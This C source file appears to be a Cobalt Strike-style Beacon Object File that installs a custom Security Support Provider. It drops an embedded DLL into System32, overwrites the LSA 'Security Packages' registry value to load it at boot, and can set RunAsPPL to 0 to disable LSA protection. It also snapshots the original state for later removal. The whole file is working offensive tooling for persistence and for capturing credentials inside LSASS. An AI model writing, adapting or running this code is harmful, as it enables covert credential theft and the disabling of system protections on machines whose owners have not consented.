// ssp_install.c — drop the embedded SSP DLL to System32, register it in
// HKLM\...\Lsa\Security Packages, report RunAsPPL posture. Reboot required
// for load (LSA reads the registry at boot only).
//
// Args (packed strings): none | "/setppl"  (/setppl resets RunAsPPL to 0;
//                          without it, a nonzero PPL is reported and install
//                          will not take effect until PPL is cleared).
//
// Build: see build_bofs.sh (objcopy-embedded sspmon2.dll, sha 66eefc85…)
#include "ssp_bof.h"

extern unsigned char ssp_dll_start[];   // objcopy-embedded kit/sspmon2.dll
extern unsigned char ssp_dll_end[];

DECLSPEC_EXPORT void go(char* args, int len)
{
    datap parser;
    int alen = 0;
    BOOL setppl = FALSE;

    BeaconDataParse(&parser, args, len);
    for (;;)
    {
        char* a = BeaconDataExtract(&parser, &alen);
        if (!a) break;
        if (alen == 7 && a[0]=='/' && a[1]=='s' && a[2]=='e' && a[3]=='t' && a[4]=='p' && a[5]=='p' && a[6]=='l')
            setppl = TRUE;
    }

    wchar_t dllPath[MAX_PATH], logPath[MAX_PATH];
    if (!SSP_Expand(SSP_DLL_PATH, dllPath, MAX_PATH)) { SSP_LastErr("expand dll path"); return; }
    SSP_Expand(SSP_LOG_PATH, logPath, MAX_PATH);

    // 0. snapshot ORIGINAL state (Security Packages bytes + RunAsPPL) so
    //    sspremove can restore exactly. Reinstall-safe: an existing snapshot
    //    is never clobbered with our own modified state.
    if (SSP_SnapshotSave())
        SSP_OutA("[+] Original state snapshotted -> %SystemRoot%\\Temp\\sst.bin\n");
    else
        SSP_OutA("[*] Snapshot: none written (already existed, or failed — sspremove will use its fallback path)\n");

    DWORD blobSize = (DWORD)(ssp_dll_end - ssp_dll_start);
    SSP_OutA("[*] sspmon2.dll blob: ");
    { wchar_t nb[24]; SSP_U64ToDecW(blobSize, nb); SSP_OutW(nb); }
    SSP_OutA(" bytes (expect 230942)\n");

    // 1. drop DLL
    HANDLE f = CreateFileW(dllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) { SSP_LastErr("CreateFileW(dll) — need admin/SYSTEM"); return; }
    DWORD written = 0;
    if (!WriteFile(f, ssp_dll_start, blobSize, &written, NULL) || written != blobSize)
    {
        SSP_LastErr("WriteFile(dll)");
        CloseHandle(f);
        return;
    }
    CloseHandle(f);
    SSP_OutA("[+] DLL dropped: %SystemRoot%\\System32\\sspmon2.dll\n");

    // 2. verify size on disk
    HANDLE v = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (v == INVALID_HANDLE_VALUE) { SSP_LastErr("verify CreateFileW"); return; }
    DWORD hi = 0, disk = GetFileSize(v, &hi);
    CloseHandle(v);
    if (disk != SSP_DLL_SIZE) { SSP_LastErr("size mismatch on disk"); return; }
    SSP_OutA("[+] On-disk size verified: 230942\n");

    // 3. registry: Security Packages = sspmon2 (REG_MULTI_SZ, overwrites value)
    HKEY k;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, SSP_REG_KEY, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &k) != ERROR_SUCCESS)
    {
        SSP_LastErr("RegOpenKeyExW(Lsa) — need admin");
        return;
    }
    wchar_t pkg[16];
    int pi = 0; const wchar_t* pn = SSP_DLL_NAME;
    while (pn[pi]) { pkg[pi] = pn[pi]; pi++; }
    pkg[pi++] = 0; pkg[pi++] = 0;                       // double-NUL terminate MULTI_SZ
    DWORD multiBytes = (DWORD)(pi * sizeof(wchar_t));
    LONG r = RegSetValueExW(k, SSP_REG_VALUE, 0, REG_MULTI_SZ, (const BYTE*)pkg, multiBytes);
    if (r != ERROR_SUCCESS)
    {
        SSP_LastErr("RegSetValueExW(Security Packages)");
        RegCloseKey(k);
        return;
    }
    SSP_OutA("[+] Lsa\\Security Packages = sspmon2\n");

    // 4. PPL posture
    DWORD ppl = 0;
    if (SSP_RegGetDword(SSP_REG_PPL, &ppl) && ppl != 0)
    {
        wchar_t vb[24]; SSP_U64ToDecW(ppl, vb);
        SSP_OutA("[!] RunAsPPL = "); SSP_OutW(vb);
        SSP_OutA(" — unsigned SSP will NOT load. ");
        if (setppl)
        {
            DWORD zero = 0;
            if (RegSetValueExW(k, SSP_REG_PPL, 0, REG_DWORD, (const BYTE*)&zero, sizeof(zero)) == ERROR_SUCCESS)
                SSP_OutA("Reset to 0 (/setppl).\n");
            else { SSP_LastErr("RegSetValueExW(RunAsPPL)"); }
        }
        else
            SSP_OutA("Re-run with /setppl to reset it to 0.\n");
    }
    else
        SSP_OutA("[+] RunAsPPL = 0 (or unset) — load path clear\n");

    RegCloseKey(k);
    SSP_OutA("[*] Installed. Reboot required: LSA loads registered packages at boot only.\n");
    SSP_OutA("[*] After reboot verify: tasklist /m sspmon2.dll  |  log: %SystemRoot%\\Temp\\ssp.log\n");
}
